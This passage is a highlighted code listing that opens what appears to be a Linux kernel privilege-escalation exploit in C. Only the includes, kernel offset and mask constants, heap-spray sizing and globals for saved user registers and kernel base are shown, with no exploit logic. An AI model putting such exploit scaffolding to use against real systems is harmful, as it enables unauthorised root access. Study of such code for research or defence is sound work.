</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span><span class="lnt">360
</span><span class="lnt">361
</span><span class="lnt">362
</span><span class="lnt">363
</span><span class="lnt">364
</span><span class="lnt">365
</span><span class="lnt">366
</span><span class="lnt">367
</span><span class="lnt">368
</span><span class="lnt">369
</span><span class="lnt">370
</span><span class="lnt">371
</span><span class="lnt">372
</span><span class="lnt">373
</span><span class="lnt">374
</span><span class="lnt">375
</span><span class="lnt">376
</span><span class="lnt">377
</span><span class="lnt">378
</span><span class="lnt">379
</span><span class="lnt">380
</span><span class="lnt">381
</span><span class="lnt">382
</span><span class="lnt">383
</span><span class="lnt">384
</span><span class="lnt">385
</span><span class="lnt">386
</span><span class="lnt">387
</span><span class="lnt">388
</span><span class="lnt">389
</span><span class="lnt">390
</span><span class="lnt">391
</span><span class="lnt">392
</span><span class="lnt">393
</span><span class="lnt">394
</span><span class="lnt">395
</span><span class="lnt">396
</span><span class="lnt">397
</span><span class="lnt">398
</span><span class="lnt">399
</span><span class="lnt">400
</span><span class="lnt">401
</span><span class="lnt">402
</span><span class="lnt">403
</span><span class="lnt">404
</span><span class="lnt">405
</span><span class="lnt">406
</span><span class="lnt">407
</span><span class="lnt">408
</span><span class="lnt">409
</span><span class="lnt">410
</span><span class="lnt">411
</span><span class="lnt">412
</span><span class="lnt">413
</span><span class="lnt">414
</span><span class="lnt">415
</span><span class="lnt">416
</span><span class="lnt">417
</span><span class="lnt">418
</span><span class="lnt">419
</span><span class="lnt">420
</span><span class="lnt">421
</span><span class="lnt">422
</span><span class="lnt">423
</span><span class="lnt">424
</span><span class="lnt">425
</span><span class="lnt">426
</span><span class="lnt">427
</span><span class="lnt">428
</span><span class="lnt">429
</span><span class="lnt">430
</span><span class="lnt">431
</span><span class="lnt">432
</span><span class="lnt">433
</span><span class="lnt">434
</span><span class="lnt">435
</span><span class="lnt">436
</span><span class="lnt">437
</span><span class="lnt">438
</span><span class="lnt">439
</span><span class="lnt">440
</span><span class="lnt">441
</span><span class="lnt">442
</span><span class="lnt">443
</span><span class="lnt">444
</span><span class="lnt">445
</span><span class="lnt">446
</span><span class="lnt">447
</span><span class="lnt">448
</span><span class="lnt">449
</span><span class="lnt">450
</span><span class="lnt">451
</span><span class="lnt">452
</span><span class="lnt">453
</span><span class="lnt">454
</span><span class="lnt">455
</span><span class="lnt">456
</span><span class="lnt">457
</span><span class="lnt">458
</span><span class="lnt">459
</span><span class="lnt">460
</span><span class="lnt">461
</span><span class="lnt">462
</span><span class="lnt">463
</span><span class="lnt">464
</span><span class="lnt">465
</span><span class="lnt">466
</span><span class="lnt">467
</span><span class="lnt">468
</span><span class="lnt">469
</span><span class="lnt">470
</span><span class="lnt">471
</span><span class="lnt">472
</span><span class="lnt">473
</span><span class="lnt">474
</span><span class="lnt">475
</span><span class="lnt">476
</span><span class="lnt">477
</span><span class="lnt">478
</span><span class="lnt">479
</span><span class="lnt">480
</span><span class="lnt">481
</span><span class="lnt">482
</span><span class="lnt">483
</span><span class="lnt">484
</span><span class="lnt">485
</span><span class="lnt">486
</span><span class="lnt">487
</span><span class="lnt">488
</span><span class="lnt">489
</span><span class="lnt">490
</span><span class="lnt">491
</span><span class="lnt">492
</span><span class="lnt">493
</span><span class="lnt">494
</span><span class="lnt">495
</span><span class="lnt">496
</span><span class="lnt">497
</span><span class="lnt">498
</span><span class="lnt">499
</span><span class="lnt">500
</span><span class="lnt">501
</span><span class="lnt">502
</span><span class="lnt">503
</span><span class="lnt">504
</span><span class="lnt">505
</span><span class="lnt">506
</span><span class="lnt">507
</span><span class="lnt">508
</span><span class="lnt">509
</span><span class="lnt">510
</span><span class="lnt">511
</span><span class="lnt">512
</span><span class="lnt">513
</span><span class="lnt">514
</span><span class="lnt">515
</span><span class="lnt">516
</span><span class="lnt">517
</span><span class="lnt">518
</span><span class="lnt">519
</span><span class="lnt">520
</span><span class="lnt">521
</span><span class="lnt">522
</span><span class="lnt">523
</span><span class="lnt">524
</span><span class="lnt">525
</span><span class="lnt">526
</span><span class="lnt">527
</span><span class="lnt">528
</span><span class="lnt">529
</span><span class="lnt">530
</span><span class="lnt">531
</span><span class="lnt">532
</span><span class="lnt">533
</span><span class="lnt">534
</span><span class="lnt">535
</span><span class="lnt">536
</span><span class="lnt">537
</span><span class="lnt">538
</span><span class="lnt">539
</span><span class="lnt">540
</span><span class="lnt">541
</span><span class="lnt">542
</span><span class="lnt">543
</span><span class="lnt">544
</span><span class="lnt">545
</span><span class="lnt">546
</span><span class="lnt">547
</span><span class="lnt">548
</span><span class="lnt">549
</span><span class="lnt">550
</span><span class="lnt">551
</span><span class="lnt">552
</span><span class="lnt">553
</span><span class="lnt">554
</span><span class="lnt">555
</span><span class="lnt">556
</span><span class="lnt">557
</span><span class="lnt">558
</span><span class="lnt">559
</span><span class="lnt">560
</span><span class="lnt">561
</span><span class="lnt">562
</span><span class="lnt">563
</span><span class="lnt">564
</span><span class="lnt">565
</span><span class="lnt">566
</span><span class="lnt">567
</span><span class="lnt">568
</span><span class="lnt">569
</span><span class="lnt">570
</span><span class="lnt">571
</span><span class="lnt">572
</span><span class="lnt">573
</span><span class="lnt">574
</span><span class="lnt">575
</span><span class="lnt">576
</span><span class="lnt">577
</span><span class="lnt">578
</span><span class="lnt">579
</span><span class="lnt">580
</span><span class="lnt">581
</span><span class="lnt">582
</span><span class="lnt">583
</span><span class="lnt">584
</span><span class="lnt">585
</span><span class="lnt">586
</span><span class="lnt">587
</span><span class="lnt">588
</span><span class="lnt">589
</span><span class="lnt">590
</span><span class="lnt">591
</span><span class="lnt">592
</span><span class="lnt">593
</span><span class="lnt">594
</span><span class="lnt">595
</span><span class="lnt">596
</span><span class="lnt">597
</span><span class="lnt">598
</span><span class="lnt">599
</span><span class="lnt">600
</span><span class="lnt">601
</span><span class="lnt">602
</span><span class="lnt">603
</span><span class="lnt">604
</span><span class="lnt">605
</span><span class="lnt">606
</span><span class="lnt">607
</span><span class="lnt">608
</span><span class="lnt">609
</span><span class="lnt">610
</span><span class="lnt">611
</span><span class="lnt">612
</span><span class="lnt">613
</span><span class="lnt">614
</span><span class="lnt">615
</span><span class="lnt">616
</span><span class="lnt">617
</span><span class="lnt">618
</span><span class="lnt">619
</span><span class="lnt">620
</span><span class="lnt">621
</span><span class="lnt">622
</span><span class="lnt">623
</span><span class="lnt">624
</span><span class="lnt">625
</span><span class="lnt">626
</span><span class="lnt">627
</span><span class="lnt">628
</span><span class="lnt">629
</span><span class="lnt">630
</span><span class="lnt">631
</span><span class="lnt">632
</span><span class="lnt">633
</span><span class="lnt">634
</span><span class="lnt">635
</span><span class="lnt">636
</span><span class="lnt">637
</span><span class="lnt">638
</span><span class="lnt">639
</span><span class="lnt">640
</span><span class="lnt">641
</span><span class="lnt">642
</span><span class="lnt">643
</span><span class="lnt">644
</span><span class="lnt">645
</span><span class="lnt">646
</span><span class="lnt">647
</span><span class="lnt">648
</span><span class="lnt">649
</span><span class="lnt">650
</span><span class="lnt">651
</span><span class="lnt">652
</span><span class="lnt">653
</span><span class="lnt">654
</span><span class="lnt">655
</span><span class="lnt">656
</span><span class="lnt">657
</span><span class="lnt">658
</span><span class="lnt">659
</span><span class="lnt">660
</span><span class="lnt">661
</span><span class="lnt">662
</span><span class="lnt">663
</span><span class="lnt">664
</span><span class="lnt">665
</span><span class="lnt">666
</span><span class="lnt">667
</span><span class="lnt">668
</span><span class="lnt">669
</span><span class="lnt">670
</span><span class="lnt">671
</span><span class="lnt">672
</span><span class="lnt">673
</span><span class="lnt">674
</span><span class="lnt">675
</span><span class="lnt">676
</span><span class="lnt">677
</span><span class="lnt">678
</span><span class="lnt">679
</span><span class="lnt">680
</span><span class="lnt">681
</span><span class="lnt">682
</span><span class="lnt">683
</span><span class="lnt">684
</span><span class="lnt">685
</span><span class="lnt">686
</span><span class="lnt">687
</span><span class="lnt">688
</span><span class="lnt">689
</span><span class="lnt">690
</span><span class="lnt">691
</span><span class="lnt">692
</span><span class="lnt">693
</span><span class="lnt">694
</span><span class="lnt">695
</span><span class="lnt">696
</span><span class="lnt">697
</span><span class="lnt">698
</span><span class="lnt">699
</span><span class="lnt">700
</span><span class="lnt">701
</span><span class="lnt">702
</span><span class="lnt">703
</span><span class="lnt">704
</span><span class="lnt">705
</span><span class="lnt">706
</span><span class="lnt">707
</span><span class="lnt">708
</span><span class="lnt">709
</span><span class="lnt">710
</span><span class="lnt">711
</span><span class="lnt">712
</span><span class="lnt">713
</span><span class="lnt">714
</span><span class="lnt">715
</span><span class="lnt">716
</span><span class="lnt">717
</span><span class="lnt">718
</span><span class="lnt">719
</span><span class="lnt">720
</span><span class="lnt">721
</span><span class="lnt">722
</span><span class="lnt">723
</span><span class="lnt">724
</span><span class="lnt">725
</span><span class="lnt">726
</span><span class="lnt">727
</span><span class="lnt">728
</span><span class="lnt">729
</span><span class="lnt">730
</span><span class="lnt">731
</span><span class="lnt">732
</span><span class="lnt">733
</span><span class="lnt">734
</span><span class="lnt">735
</span><span class="lnt">736
</span><span class="lnt">737
</span><span class="lnt">738
</span><span class="lnt">739
</span><span class="lnt">740
</span><span class="lnt">741
</span><span class="lnt">742
</span><span class="lnt">743
</span><span class="lnt">744
</span><span class="lnt">745
</span><span class="lnt">746
</span><span class="lnt">747
</span><span class="lnt">748
</span><span class="lnt">749
</span><span class="lnt">750
</span><span class="lnt">751
</span><span class="lnt">752
</span><span class="lnt">753
</span><span class="lnt">754
</span><span class="lnt">755
</span><span class="lnt">756
</span><span class="lnt">757
</span><span class="lnt">758
</span><span class="lnt">759
</span><span class="lnt">760
</span><span class="lnt">761
</span><span class="lnt">762
</span><span class="lnt">763
</span><span class="lnt">764
</span><span class="lnt">765
</span><span class="lnt">766
</span><span class="lnt">767
</span><span class="lnt">768
</span><span class="lnt">769
</span><span class="lnt">770
</span><span class="lnt">771
</span><span class="lnt">772
</span><span class="lnt">773
</span><span class="lnt">774
</span><span class="lnt">775
</span><span class="lnt">776
</span><span class="lnt">777
</span><span class="lnt">778
</span><span class="lnt">779
</span><span class="lnt">780
</span><span class="lnt">781
</span><span class="lnt">782
</span><span class="lnt">783
</span><span class="lnt">784
</span><span class="lnt">785
</span><span class="lnt">786
</span><span class="lnt">787
</span><span class="lnt">788
</span><span class="lnt">789
</span><span class="lnt">790
</span><span class="lnt">791
</span><span class="lnt">792
</span><span class="lnt">793
</span><span class="lnt">794
</span><span class="lnt">795
</span><span class="lnt">796
</span><span class="lnt">797
</span><span class="lnt">798
</span><span class="lnt">799
</span><span class="lnt">800
</span><span class="lnt">801
</span><span class="lnt">802
</span><span class="lnt">803
</span><span class="lnt">804
</span><span class="lnt">805
</span><span class="lnt">806
</span><span class="lnt">807
</span><span class="lnt">808
</span><span class="lnt">809
</span><span class="lnt">810
</span><span class="lnt">811
</span><span class="lnt">812
</span><span class="lnt">813
</span><span class="lnt">814
</span><span class="lnt">815
</span><span class="lnt">816
</span><span class="lnt">817
</span><span class="lnt">818
</span><span class="lnt">819
</span><span class="lnt">820
</span><span class="lnt">821
</span><span class="lnt">822
</span><span class="lnt">823
</span><span class="lnt">824
</span><span class="lnt">825
</span><span class="lnt">826
</span><span class="lnt">827
</span><span class="lnt">828
</span><span class="lnt">829
</span><span class="lnt">830
</span><span class="lnt">831
</span><span class="lnt">832
</span><span class="lnt">833
</span><span class="lnt">834
</span><span class="lnt">835
</span><span class="lnt">836
</span><span class="lnt">837
</span><span class="lnt">838
</span><span class="lnt">839
</span><span class="lnt">840
</span><span class="lnt">841
</span><span class="lnt">842
</span><span class="lnt">843
</span><span class="lnt">844
</span><span class="lnt">845
</span><span class="lnt">846
</span><span class="lnt">847
</span><span class="lnt">848
</span><span class="lnt">849
</span><span class="lnt">850
</span><span class="lnt">851
</span><span class="lnt">852
</span><span class="lnt">853
</span><span class="lnt">854
</span><span class="lnt">855
</span><span class="lnt">856
</span><span class="lnt">857
</span><span class="lnt">858
</span><span class="lnt">859
</span><span class="lnt">860
</span><span class="lnt">861
</span><span class="lnt">862
</span><span class="lnt">863
</span><span class="lnt">864
</span><span class="lnt">865
</span><span class="lnt">866
</span><span class="lnt">867
</span><span class="lnt">868
</span><span class="lnt">869
</span><span class="lnt">870
</span><span class="lnt">871
</span><span class="lnt">872
</span><span class="lnt">873
</span><span class="lnt">874
</span><span class="lnt">875
</span><span class="lnt">876
</span><span class="lnt">877
</span><span class="lnt">878
</span><span class="lnt">879
</span><span class="lnt">880
</span><span class="lnt">881
</span><span class="lnt">882
</span><span class="lnt">883
</span><span class="lnt">884
</span><span class="lnt">885
</span><span class="lnt">886
</span><span class="lnt">887
</span><span class="lnt">888
</span><span class="lnt">889
</span><span class="lnt">890
</span><span class="lnt">891
</span><span class="lnt">892
</span><span class="lnt">893
</span><span class="lnt">894
</span><span class="lnt">895
</span><span class="lnt">896
</span><span class="lnt">897
</span><span class="lnt">898
</span><span class="lnt">899
</span><span class="lnt">900
</span><span class="lnt">901
</span><span class="lnt">902
</span><span class="lnt">903
</span><span class="lnt">904
</span><span class="lnt">905
</span><span class="lnt">906
</span><span class="lnt">907
</span><span class="lnt">908
</span><span class="lnt">909
</span><span class="lnt">910
</span><span class="lnt">911
</span><span class="lnt">912
</span><span class="lnt">913
</span><span class="lnt">914
</span><span class="lnt">915
</span><span class="lnt">916
</span><span class="lnt">917
</span><span class="lnt">918
</span><span class="lnt">919
</span><span class="lnt">920
</span><span class="lnt">921
</span><span class="lnt">922
</span><span class="lnt">923
</span><span class="lnt">924
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">// #include &lt;keyutils.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;sys/prctl.h&gt;  </span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/userfaultfd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;poll.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ipc.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/msg.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/shm.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/xattr.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/genetlink.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/if_packet.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/netlink.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/openvswitch.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;net/ethernet.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;net/if.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sched.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/utsname.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/time.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">// #define DEBUG 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define COLOR_GREEN &#34;\033[32m&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">#define COLOR_RED &#34;\033[31m&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">#define COLOR_YELLOW &#34;\033[33m&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">#define COLOR_DEFAULT &#34;\033[0m&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">#define ELEM_CNT(x) (sizeof(x) / sizeof(x[0]))
</span></span></span><span class="line"><span class="cl"><span class="cp">#define SYS_SETRESUID_OFFSET (0xd81d0)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PREFIX_BUF_LEN (16)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define logd(fmt, ...) dprintf(2, &#34;[*] %s:%d &#34; fmt &#34;\n&#34;, __FILE__, __LINE__, ##__VA_ARGS__)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define logi(fmt, ...) dprintf(2, COLOR_GREEN &#34;[+] %s:%d &#34; fmt &#34;\n&#34; COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define logw(fmt, ...) dprintf(2, COLOR_YELLOW &#34;[!] %s:%d &#34; fmt &#34;\n&#34; COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define loge(fmt, ...) dprintf(2, COLOR_RED &#34;[-] %s:%d &#34; fmt &#34;\n&#34; COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define die(fmt, ...)                      \
</span></span></span><span class="line"><span class="cl"><span class="cp">    do {                                   \
</span></span></span><span class="line"><span class="cl"><span class="cp">        loge(fmt, ##__VA_ARGS__);          \
</span></span></span><span class="line"><span class="cl"><span class="cp">        loge(&#34;Exit at line %d&#34;, __LINE__); \
</span></span></span><span class="line"><span class="cl"><span class="cp">        write(sync_pipe[1], &#34;F&#34;, 1);       \
</span></span></span><span class="line"><span class="cl"><span class="cp">        exit(1);                           \
</span></span></span><span class="line"><span class="cl"><span class="cp">    } while (0)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">sync_pipe</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cp">#ifdef DEBUG
</span></span></span><span class="line"><span class="cl"><span class="cp">#define debug(...) printf(__VA_ARGS__)
</span></span></span><span class="line"><span class="cl"><span class="cp">#else
</span></span></span><span class="line"><span class="cl"><span class="cp">#define debug(...) do {} while (0)
</span></span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define HEAP_MASK 0xffff000000000000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define KERNEL_MASK 0xffffffff00000000
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_SIZE 4096
</span></span></span><span class="line"><span class="cl"><span class="cp">#define MAX_KEYS 199
</span></span></span><span class="line"><span class="cl"><span class="cp">#define N_STACK_PPS 30
</span></span></span><span class="line"><span class="cl"><span class="cp">#define POLLFD_PER_PAGE 510
</span></span></span><span class="line"><span class="cl"><span class="cp">#define POLL_LIST_SIZE 16
</span></span></span><span class="line"><span class="cl"><span class="cp">#define MMAP_ADDR ((void *)0xdead0000)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define NFDS(size) (((size - POLL_LIST_SIZE) / sizeof(struct pollfd)) + N_STACK_PPS);
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">pthread_t</span> <span class="n">poll_tid</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">poll_threads</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">pthread_mutex_t</span> <span class="n">mutex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">usr_cs</span><span class="p">,</span> <span class="n">usr_ss</span><span class="p">,</span> <span class="n">usr_rflags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">proc_single_show</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">target_object</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">kernel_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">pipes</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">][</span><span class="mi">2</span><span class="p">];</span>
